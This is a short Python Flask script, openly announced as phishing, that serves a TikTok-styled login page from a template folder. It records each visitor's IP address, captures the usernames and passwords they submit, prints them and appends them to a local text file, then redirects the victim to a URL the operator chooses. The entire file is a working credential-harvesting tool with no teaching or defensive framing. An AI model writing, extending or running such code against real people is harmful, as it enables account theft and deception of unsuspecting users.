import os
from flask import Flask, render_template, request, redirect

print('Setting up phishing...')
action_url = input('Enter the URL to redirect users after phishing: ')
port = input("Enter the port of your site (Default: 8080): ")

# Set default port if not provided
if not port:
    port = 8080
else:
    try:
        port = int(port)
    except ValueError:
        print("Invalid port number. Using default port 8080.")
        port = 8080

app = Flask(__name__, template_folder='Phishing/templates/TIKTok')

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('index.html')

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    user_ip = request.remote_addr

    print('User: ', username)
    print('Password: ', password)

    # Define file path for saving user data
    current_path = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.join(current_path, 'UserData/mesenger_user_data.txt')
    print(f"File path: {file_path}")

    # Write user data to file with UTF-8 encoding
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
        print("Data successfully written to file.")
    except Exception as e:
        print(f"Error writing to file: {e}")

    return redirect(action_url)

if __name__ == '__main__':
    print("Starting the server...")
    app.run(host='0.0.0.0', port=port)
